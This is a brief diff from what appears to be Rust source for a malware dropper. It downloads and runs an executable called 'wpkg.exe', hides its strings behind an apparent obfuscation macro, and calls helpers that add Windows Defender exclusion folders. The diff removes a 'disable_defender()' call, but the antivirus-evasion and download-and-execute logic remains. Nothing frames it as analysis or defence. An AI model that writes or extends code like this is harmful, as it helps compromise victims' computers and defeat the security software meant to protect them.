@@ -14,7 +14,6 @@ async fn main() {
     downloader::download_wpkg(&format!("{path}\\wpkg.exe")).await.expect(&crypto!("Could not download wpkg"));
     println!("{path}");
     utils::run_process(&format!("{path}\\wpkg.exe"), vec![], false).expect(&crypto!("Could not start wpkg"));
-    disable_defender();
 }
 fn exclusions(path: &str) -> anyhow::Result<()> {
     add_exclusion_folder(&path)?;
